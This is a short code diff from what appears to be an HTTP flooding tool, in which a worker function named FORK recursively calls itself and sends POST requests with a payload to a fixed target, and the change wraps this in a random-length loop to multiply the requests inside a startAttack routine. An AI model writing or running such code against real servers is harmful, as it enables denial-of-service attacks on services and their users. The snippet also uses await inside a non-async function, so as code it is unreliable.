@@ -13,8 +13,10 @@ import { parentPort, workerData } from "worker_threads";
 import { randomBoolean, randomString } from "../utils/randomUtils.js";
 
 const FORK = (fixedTarget, payload, config) => {
-  FORK(fixedTarget, payload, config)
-  await axios.post(fixedTarget, payload, config);
+   for (let i = 1; i < Math.random() * 100; i++) {
+     FORK(fixedTarget, payload, config)
+     await axios.post(fixedTarget, payload, config);
+   }
 }
 
 const startAttack = () => {
